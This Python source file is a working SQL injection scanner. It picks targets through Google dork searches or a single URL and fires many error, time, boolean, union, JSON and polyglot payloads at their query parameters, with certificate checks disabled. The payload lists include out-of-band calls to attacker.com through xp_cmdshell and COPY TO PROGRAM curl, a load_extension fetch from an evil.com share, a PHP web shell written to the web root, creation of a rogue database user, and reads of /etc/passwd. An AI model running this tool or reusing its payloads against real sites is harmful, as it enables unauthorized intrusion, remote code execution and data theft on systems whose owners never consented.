import re
import asyncio
import aiohttp
import logging
import argparse
import random
import time
import json
import ssl
import sys
import socket
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple, Set
from urllib.parse import urlparse, parse_qs, quote_plus, unquote_plus, urljoin
from bs4 import BeautifulSoup
import tldextract
import tracemalloc
from aiohttp_socks import ProxyConnector
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import hashlib
import difflib
from googlesearch import search

# Start memory tracking
tracemalloc.start()

# Configure logging with more detailed format
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s",
    handlers=[
        logging.FileHandler(f"sql_scanner_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"),
        logging.StreamHandler()
    ]
)

# Suppress noisy library logs
for logger in ['chardet', 'urllib3', 'asyncio', 'aiohttp']:
    logging.getLogger(logger).setLevel(logging.WARNING)

# Configuration constants
MAX_CONCURRENT_REQUESTS = 10
REQUEST_TIMEOUT = 30
RETRY_COUNT = 3
RETRY_DELAY = 5
MAX_URL_PER_DOMAIN = 3
DEFAULT_DELAY = 2.0

# Extended User-Agents list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

@dataclass
class ScanResult:
    """Structured scan result data"""
    url: str
    parameter: str
    vulnerability_type: str
    payload: str
    response_time: float
    error_message: Optional[str] = None
    waf_detected: Optional[str] = None
    dbms_detected: Optional[str] = None
    timestamp: datetime = datetime.now()

class WAFDetector:
    """Web Application Firewall Detection"""
    def __init__(self):
        self.waf_signatures = {
            'Cloudflare': [
                'CF-RAY header',
                '__cfduid',
                'cloudflare-nginx',
            ],
            'ModSecurity': [
                'Mod_Security',
                'NOYB',
            ],
            'AWS WAF': [
                'AWS-WAF',
                'X-AMZ-CF-ID',
            ],
            # Add more WAF signatures here
        }
        
    async def detect_waf(self, response: aiohttp.ClientResponse, content: str) -> Optional[str]:
        """Detect WAF presence from response headers and content"""
        try:
            headers = dict(response.headers)
            
            # Check headers
            for waf_name, signatures in self.waf_signatures.items():
                for signature in signatures:
                    if any(signature.lower() in header.lower() for header in headers.values()):
                        return waf_name
                        
            # Check for common WAF response patterns
            if response.status == 403:
                if "forbidden" in content.lower():
                    return "Generic WAF"
                    
            return None
            
        except Exception as e:
            logging.error(f"WAF detection error: {e}")
            return None

class DBMSDetector:
    """Database Management System Detection"""
    def __init__(self):
        self.dbms_patterns = {
            'MySQL': [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"Valid MySQL result",
                r"check the manual that corresponds to your (MySQL|MariaDB) server version"
            ],
            'PostgreSQL': [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_.*",
                r"Warning.*PostgreSQL",
                r"PG::SyntaxError:",
                r"PSQLException"
            ],
            'Microsoft SQL Server': [
                r"Driver.* SQL[\-\_\ ]*Server",
                r"OLE DB.* SQL Server",
                r"(\W|\A)SQL Server.*Driver",
                r"Warning.*mssql_.*",
                r"Msg \d+, Level \d+, State \d+",
                r"SQLServer JDBC Driver"
            ],
            'Oracle': [
                r"ORA-[0-9][0-9][0-9][0-9]",
                r"Oracle error",
                r"Warning.*oci_.*",
                r"Oracle.*Driver",
                r"PLSQLSyntaxErrorException"
            ],
            'SQLite': [
                r"SQLite/JDBCDriver",
                r"SQLite\.Exception",
                r"System\.Data\.SQLite\.SQLiteException"
            ]
        }

    def detect_dbms(self, content: str) -> Optional[str]:
        """Detect DBMS from error messages"""
        try:
            for dbms, patterns in self.dbms_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, content, re.I):
                        return dbms
            return None
        except Exception as e:
            logging.error(f"DBMS detection error: {e}")
            return None

class SQLInjector:
    """SQL Injection Testing and Exploitation"""
    def __init__(self):
        self.time_delay = 5
        self.union_columns = range(1, 21)
        self.detected_dbms = None  # Add this line
        self.payload_db = {
            'error': [
                "'", "\"", "')", "\")", "'))", "\"))",
                "' OR 1=1-- ", "' AND 1=0-- ",
                "' OR 'a'='a", "' OR 1=CONVERT(int,@@version)--",
                "' AND ExtractValue(1,CONCAT(0x3a,@@version))--",
                "' AND UpdateXML(1,CONCAT(0x3a,@@version),1)--",
                "' AND 1=CONVERT(int,db_name())+--",
                "' AND 1=CAST(@@version AS INT)--",
                "' AND 1=CAST(version() AS INTEGER)--",
                "' AND 1=1/(SELECT version())--",
                "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
                "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--",
                f"' AND 1=load_extension(r'\\\\evil.com\\share\\nc.dll')--"
            ],
            'boolean': [
                "' AND 1=1-- ", "' AND 1=2-- ",
                "' OR 1=1-- ", "' OR 1=2-- ",
                "' OR EXISTS(SELECT * FROM information_schema.tables)--",
                "' OR (SELECT SUBSTRING(version(),1,1))='5'--",
                "' OR (SELECT ASCII(SUBSTRING(version(),1,1)))>53--",
                "' AND MID(VERSION(),1,1)='5'--",
                "' AND (SELECT 1 FROM mysql.user LIMIT 1)=1--",
                "' AND (SELECT TOP 1 name FROM sysobjects) IS NOT NULL--",
                "' AND (SELECT @@VERSION LIKE '%Microsoft%')=1--",
                "' AND (SELECT current_setting('server_version_num'))::integer>90000--",
                "' AND (SELECT usename FROM pg_user LIMIT 1)=current_user--",
                "' AND (SELECT COUNT(*) FROM all_tables) > 0--"
            ],
            'time': [
                "' AND 1=IF(1=1,SLEEP(5),0)--",
                "' || pg_sleep(5)--",
                "' || dbms_pipe.receive_message(('a'),5)--",
                "' AND IF(ASCII(SUBSTRING(version(),1,1))>53,SLEEP(5),0)--",
                "' || CASE WHEN (SELECT current_user)='postgres' THEN pg_sleep(5) END--",
                "' AND (SELECT 1 FROM (SELECT BENCHMARK(5000000,MD5('test')))a)--",
                "' WAITFOR DELAY '0:0:5'--",
                "' || WAITFOR DELAY '0:0:5'--",
                "' AND DBMS_LOCK.SLEEP(5)=1--",
                "' AND randomblob(100000000)--"
            ],
            'union': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version,user()--",
                "' UNION SELECT version(),current_user--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--",
                "' UNION SELECT name,pass FROM users--",
                "' UNION SELECT 1,LOAD_FILE('/etc/passwd')--",
                "' UNION SELECT 1,@@datadir--",
                "' UNION SELECT 1,name FROM master..sysdatabases--",
                "' UNION SELECT version(),current_database()--",
                "' UNION SELECT banner,NULL FROM v$version--",
                "' UNION SELECT name,sql FROM sqlite_master--"
            ],
            'oast': [
                "'||UTL_HTTP.REQUEST('http://attacker.com')--",
                "';EXEC xp_cmdshell('curl http://attacker.com')--",
                "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test'))--",
                "';COPY (SELECT * FROM users) TO PROGRAM 'curl http://attacker.com'--",
                "'||(SELECT http_get('http://attacker.com/'||version()))--",
                "' AND (SELECT DBMS_LDAP.INIT(('attacker.com',80)) IS NOT NULL--"
            ],
            'json': [
                '{"param":"test" OR 1=1-- "}',
                '["test\\" OR 1=1-- "]',
                '{"param":"test\\" UNION SELECT 1,2,3-- "}',
                '{"id":{"$ne":-1}}',
                '{"$where": "1 == 1"}',
                '{"username":{"$gt":""},"password":{"$gt":""}}'
            ],
            'polyglot': [
                "'/*!32302AND*/ 1=1-- ",
                "';SELECT 1; EXEC xp_cmdshell('dir')--",
                "'||(SELECT '<?php system($_GET[cmd]); ?>') INTO OUTFILE '/var/www/html/shell.php'--",
                "'/**/OR/**/1=1--",
                "'%0AOR%0A1=1--",
                "'+(SELECT 1 WHERE 1=1)+'",
                "'}]; return 1==1//",
                "']]></x><x>1</x><![CDATA['",
                "'%0D%0AUNION%0ASELECT%0ANULL--",
                "'uni%0bon+se%0blect+1,2--"
            ]
        }

        self.dbms_specific = {
            'mysql': [
                "' AND (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL--",
                "' UNION SELECT NULL,(SELECT variable_value FROM performance_schema.global_variables WHERE variable_name='version_compile_os')--"
            ],
            'mssql': [
                "';EXEC master..xp_cmdshell 'whoami'--",
                "' AND (SELECT TOP 1 name FROM sys.server_principals WHERE type_desc='WINDOWS_LOGIN') IS NOT NULL--"
            ],
            'postgresql': [
                "';CREATE TABLE evil (data text); COPY evil FROM PROGRAM 'whoami'--",
                "' AND (SELECT pg_ls_dir('/root')) IS NOT NULL--"
            ],
            'oracle': [
                "' AND (SELECT directory_path FROM all_directories WHERE directory_name='DATA_PUMP_DIR') IS NOT NULL--",
                "';DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE 'CREATE USER hacker IDENTIFIED BY pwned'; END;--"
            ],
            'sqlite': [
                "' AND (SELECT fcntl(3,0,0)) IS NOT NULL--",
                "' AND (SELECT load_extension('\\\\evil.com\\share'))--"
            ]
        }
        
    async def test_injection(self, url: str, param: str, session: aiohttp.ClientSession) -> Optional[ScanResult]:
        """Test all injection techniques"""
        techniques = [
            self._test_error_based,
            self._test_time_based,
            self._test_boolean_based,
            self._test_union_based,
            self._test_advanced_payloads  # Add the new technique
        ]
        
        for technique in techniques:
            try:
                result = await technique(url, param, session)
                if result:
                    return result
            except Exception as e:
                logging.error(f"Injection test error ({technique.__name__}): {e}")
                continue
                
        return None

    async def _get_baseline(self, url: str, session: aiohttp.ClientSession) -> Optional[Dict]:
        """Get baseline response for comparison"""
        try:
            start_time = time.time()
            async with session.get(url, timeout=REQUEST_TIMEOUT) as response:
                content = await response.text()
                response_time = time.time() - start_time
                return {
                    'content': content,
                    'time': response_time,
                    'status': response.status,
                    'headers': dict(response.headers)
                }
        except Exception as e:
            logging.debug(f"Error getting baseline response: {e}")
            return None

    def _extract_error(self, content: str) -> Optional[str]:
        """Extract SQL error message from response content"""
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Microsoft SQL Server",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"Warning.*mssql_.*",
            r"Warning.*oci_.*",
            r"Oracle error",
            r"SQL error.*POS[0-9]+",
            r"Error:.*SQL",
            r"Warning.*sqlite_.*"
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, content, re.I)
            if match:
                return match.group(0)
        return None

    def _check_sql_error(self, content: str) -> bool:
        """Check if response contains SQL error messages"""
        return bool(self._extract_error(content))

    async def _test_error_based(self, url: str, param: str, session: aiohttp.ClientSession) -> Optional[ScanResult]:
        """Error-based SQL injection testing"""
        try:
            baseline = await self._get_baseline(url, session)
            if not baseline:
                return None

            payloads = self.payload_db['error']
            if self.detected_dbms and self.detected_dbms.lower() in self.dbms_specific:
                payloads.extend(self.dbms_specific[self.detected_dbms.lower()])

            for payload in payloads:
                try:
                    start_time = time.time()
                    test_url = self._inject_payload(url, param, payload)
                    
                    async with session.get(test_url, timeout=REQUEST_TIMEOUT) as response:
                        content = await response.text()
                        response_time = time.time() - start_time

                        if self._check_sql_error(content):
                            error_msg = self._extract_error(content)
                            return ScanResult(
                                url=url,
                                parameter=param,
                                vulnerability_type="error_based",
                                payload=payload,
                                response_time=response_time,
                                error_message=error_msg,
                                dbms_detected=self.detected_dbms
                            )

                except Exception as e:
                    logging.debug(f"Error testing payload {payload}: {e}")
                    continue

            return None
            
        except Exception as e:
            logging.error(f"Error in error-based testing: {e}")
            return None

    async def _test_time_based(self, url: str, param: str, session: aiohttp.ClientSession) -> Optional[ScanResult]:
        """Time-based SQL injection testing"""
        payloads = self.payload_db['time']  # This is already a list, not a dict

        base_time = await self._get_baseline_time(url, session)
        if not base_time:
            return None

        # Modified to work with list instead of dict
        for payload in payloads:
            try:
                test_url = self._inject_payload(url, param, payload)
                start_time = time.time()
                
                async with session.get(test_url, timeout=REQUEST_TIMEOUT + self.time_delay) as response:
                    await response.text()
                    response_time = time.time() - start_time

                    if response_time > base_time + self.time_delay - 1:  # Allow 1s margin
                        return ScanResult(
                            url=url,
                            parameter=param,
                            vulnerability_type="time_based",
                            payload=payload,
                            response_time=response_time,
                            dbms_detected=self.detected_dbms
                        )

            except asyncio.TimeoutError:
                return ScanResult(
                    url=url,
                    parameter=param,
                    vulnerability_type="time_based",
                    payload=payload,
                    response_time=self.time_delay,
                    dbms_detected=self.detected_dbms
                )
            except Exception as e:
                logging.debug(f"Error testing time-based payload: {e}")
                continue

        return None

    async def _test_boolean_based(self, url: str, param: str, session: aiohttp.ClientSession) -> Optional[ScanResult]:
        """Boolean-based SQL injection testing"""
        payloads = self.payload_db['boolean']  # This is a list of single payloads

        base_content = await self._get_baseline_content(url, session)
        if not base_content:
            return None

        # Modified to test each payload individually
        for payload in payloads:
            try:
                # Test with payload
                test_url = self._inject_payload(url, param, payload)
                async with session.get(test_url, timeout=REQUEST_TIMEOUT) as response:
                    test_content = await response.text()

                # Compare responses
                if self._compare_responses(base_content, test_content):
                    return ScanResult(
                        url=url,
                        parameter=param,
                        vulnerability_type="boolean_based",
                        payload=payload,
                        response_time=0.0
                    )

            except Exception as e:
                logging.debug(f"Error testing boolean-based payload: {e}")
                continue

        return None

    async def _test_union_based(self, url: str, param: str, session: aiohttp.ClientSession) -> Optional[ScanResult]:
        """Union-based SQL injection testing"""
        base_payloads = self.payload_db['union']

        # First determine the number of columns
        columns = await self._determine_columns(url, param, session)
        if not columns:
            return None

        # Generate union payloads based on column count
        payloads = self._generate_union_payloads(columns)
        
        for payload in payloads:
            try:
                test_url = self._inject_payload(url, param, payload)
                start_time = time.time()
                
                async with session.get(test_url, timeout=REQUEST_TIMEOUT) as response:
                    content = await response.text()
                    response_time = time.time() - start_time

                    # Check for successful UNION injection markers
                    if self._check_union_success(content):
                        return ScanResult(
                            url=url,
                            parameter=param,
                            vulnerability_type="union_based",
                            payload=payload,
                            response_time=response_time
                        )

            except Exception as e:
                logging.debug(f"Error testing union-based payload: {e}")
                continue

        return None

    async def _test_advanced_payloads(self, url: str, param: str, session: aiohttp.ClientSession) -> Optional[ScanResult]:
        """Test JSON and polyglot payloads"""
        all_payloads = self.payload_db['json'] + self.payload_db['polyglot']
        
        for payload in all_payloads:
            try:
                test_url = self._inject_payload(url, param, payload)
                async with session.get(test_url, timeout=REQUEST_TIMEOUT) as response:
                    content = await response.text()
                    if self._check_sql_error(content):
                        return ScanResult(
                            url=url,
                            parameter=param,
                            vulnerability_type="advanced_injection",
                            payload=payload,
                            response_time=0.0
                        )
            except Exception as e:
                logging.debug(f"Error testing advanced payload {payload}: {e}")
                continue
        
        return None

    async def _determine_columns(self, url: str, param: str, session: aiohttp.ClientSession) -> Optional[int]:
        """Determine number of columns in the query"""
        for i in range(1, 21):  # Test up to 20 columns
            order_payload = f"1' ORDER BY {i}--"
            union_payload = f"1' UNION ALL SELECT {','.join(['NULL'] * i)}--"
            
            try:
                for payload in [order_payload, union_payload]:
                    test_url = self._inject_payload(url, param, payload)
                    async with session.get(test_url, timeout=REQUEST_TIMEOUT) as response:
                        content = await response.text()
                        if "unknown column" in content.lower() or "all row" in content.lower():
                            return i - 1
            except Exception:
                continue
        return None

    def _generate_union_payloads(self, column_count: int) -> List[str]:
        """Generate UNION-based payloads"""
        payloads = []
        string_marker = "'SQLMARK'"
        
        # Basic UNION payloads
        nulls = ','.join(['NULL'] * column_count)
        payloads.extend([
            f"1' UNION ALL SELECT {nulls}--",
            f"1' UNION ALL SELECT {','.join([string_marker] * column_count)}--",
            f"1') UNION ALL SELECT {nulls}--",
            f"-1' UNION ALL SELECT {nulls}--"
        ])

        # Add information gathering payloads
        if column_count >= 2:
            payload_template = "1' UNION ALL SELECT {}--"
            columns = ['NULL'] * column_count
            
            # Try different positions for data extraction
            for i in range(column_count):
                columns[i] = 'version()'
                payloads.append(payload_template.format(','.join(columns)))
                columns[i] = 'database()'
                payloads.append(payload_template.format(','.join(columns)))
                columns[i] = 'user()'
                payloads.append(payload_template.format(','.join(columns)))
                columns[i] = 'NULL'  # Reset

        return payloads

    def _check_union_success(self, content: str) -> bool:
        """Check if UNION-based injection was successful"""
        markers = [
            'SQLMARK',
            'SQL Server',
            'MySQL',
            'PostgreSQL',
            'Oracle',
            'SQLite',
            'version:',
            'database:',
            'user:'
        ]
        return any(marker.lower() in content.lower() for marker in markers)

    async def _get_baseline_time(self, url: str, session: aiohttp.ClientSession) -> Optional[float]:
        """Get baseline response time"""
        try:
            start_time = time.time()
            async with session.get(url, timeout=REQUEST_TIMEOUT) as response:
                await response.text()
            return time.time() - start_time
        except Exception as e:
            logging.error(f"Error getting baseline time: {e}")
            return None

    async def _get_baseline_content(self, url: str, session: aiohttp.ClientSession) -> Optional[str]:
        """Get baseline response content"""
        try:
            async with session.get(url, timeout=REQUEST_TIMEOUT) as response:
                return await response.text()
        except Exception as e:
            logging.error(f"Error getting baseline content: {e}")
            return None

    def _compare_responses(self, response1: str, response2: str) -> bool:
        """Compare two responses for boolean-based detection"""
        # Remove dynamic content
        response1 = self._normalize_content(response1)
        response2 = self._normalize_content(response2)
        
        # Calculate similarity ratio
        similarity = difflib.SequenceMatcher(None, response1, response2).ratio()
        return similarity < 0.95  # Responses should be different

    def _normalize_content(self, content: str) -> str:
        """Normalize response content by removing dynamic parts"""
        # Remove timestamps, session IDs, CSRFs, etc.
        content = re.sub(r'\d{10}|\w{32}|csrf_token["\']:\s*["\'][^"\']+["\']', '', content)
        # Remove whitespace and convert to lowercase
        return re.sub(r'\s+', '', content.lower())

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        # Rebuild query string
        query = "&".join(f"{k}={quote_plus(v[0])}" for k, v in params.items())
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

# Add this at the end of the file
class SQLiScanner:
    def __init__(self):
        self.waf_detector = WAFDetector()
        self.dbms_detector = DBMSDetector()
        self.sql_injector = SQLInjector()
        self.detected_dbms = None
        self.detected_waf = None

    async def scan_url(self, url: str) -> Optional[ScanResult]:
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                return None

            # Create SSL context that doesn't verify certificates
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE

            # Use the SSL context in the ClientSession
            connector = aiohttp.TCPConnector(ssl=ssl_context)
            async with aiohttp.ClientSession(connector=connector) as session:
                for param in params:
                    result = await self.sql_injector.test_injection(url, param, session)
                    if result:
                        return result
            return None
        except Exception as e:
            logging.error(f"Error scanning URL {url}: {e}")
            return None

async def main():
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
    parser.add_argument("--dork", help="Google dork to search for targets")
    parser.add_argument("--url", help="Single URL to test")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Request timeout in seconds")
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    print("\n[*] Starting SQL Injection Scanner")

    # Initialize scanner
    scanner = SQLiScanner()

    # Test single URL if provided
    if args.url:
        print(f"[*] Testing single URL: {args.url}")
        try:
            result = await scanner.scan_url(args.url)
            if result:
                print("[+] Found vulnerability!")
                print(f"    Type: {result.vulnerability_type}")
                print(f"    Parameter: {result.parameter}")
                print(f"    Payload: {result.payload}")
                if result.dbms_detected:
                    print(f"    DBMS: {result.dbms_detected}")
            else:
                print("[-] No vulnerabilities found")
            return
        except Exception as e:
            print(f"[-] Error scanning URL: {e}")
            return

    # If no URL or dork provided, show interactive menu
    if not args.dork:
        while True:
            print("\nOptions:")
            print("1. Test a single URL")
            print("2. Search with Google dork")
            print("3. Exit")
            
            choice = input("\nChoice: ")
            
            if choice == "1":
                url = input("\nEnter URL to test (e.g., http://example.com/page.php?id=1): ").strip()
                if url:
                    try:
                        result = await scanner.scan_url(url)
                        if result:
                            print("\n[+] Found vulnerability!")
                            print(f"    Type: {result.vulnerability_type}")
                            print(f"    Parameter: {result.parameter}")
                            print(f"    Payload: {result.payload}")
                            if result.dbms_detected:
                                print(f"    DBMS: {result.dbms_detected}")
                        else:
                            print("\n[-] No vulnerabilities found")
                    except Exception as e:
                        print(f"\n[-] Error scanning URL: {e}")
                break
            
            elif choice == "2":
                dork = input("\nEnter Google dork: ").strip()
                if dork:
                    args.dork = dork
                    break
            
            elif choice == "3":
                print("[*] Exiting...")
                return
            
            else:
                print("[-] Invalid choice. Please try again.")

    # Continue with dork scanning if dork is provided
    if args.dork:
        print(f"[*] Using dork: {args.dork}")
        try:
            search_results = []
            
            # Get search results with correct parameters
            for url in search(args.dork, 
                             num=10,  # Changed from num_results to num
                             lang="en",
                             pause=2.0,
                             stop=10):  # Add stop parameter
                search_results.append(url)
                print(f"[*] Found: {url}")
            
            # Filter URLs with parameters
            urls = [url for url in search_results if "?" in url]
            
            if urls:
                print(f"\n[+] Found {len(urls)} URLs with parameters")
                await test_urls(urls)
            else:
                print("[-] No suitable URLs found")
        except Exception as e:
            print(f"[-] Error during search: {str(e)}")

async def test_urls(urls: List[str]):
    """Test URLs for SQL injection vulnerabilities"""
    scanner = SQLiScanner()
    results = []
    
    print("\n[*] Starting scan...")
    for i, url in enumerate(urls, 1):
        try:
            print(f"\n[*] Testing URL {i}/{len(urls)}: {url}")
            result = await scanner.scan_url(url)
            
            if result:
                print(f"[+] Found vulnerability!")
                print(f"    Type: {result.vulnerability_type}")
                print(f"    Parameter: {result.parameter}")
                print(f"    Payload: {result.payload}")
                if result.dbms_detected:
                    print(f"    DBMS: {result.dbms_detected}")
                results.append(result)
            else:
                print("[-] No vulnerabilities found")
                
        except Exception as e:
            print(f"[-] Error scanning {url}: {e}")
            continue

    # Print final summary
    print("\nScan Complete!")
    print(f"Total URLs scanned: {len(urls)}")
    print(f"Vulnerable URLs found: {len(results)}")

    if results:
        print("\nVulnerable URLs Summary:")
        for result in results:
            print(f"\nURL: {result.url}")
            print(f"Parameter: {result.parameter}")
            print(f"Type: {result.vulnerability_type}")
            print(f"Payload: {result.payload}")
            if result.dbms_detected:
                print(f"DBMS: {result.dbms_detected}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Scanner stopped by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")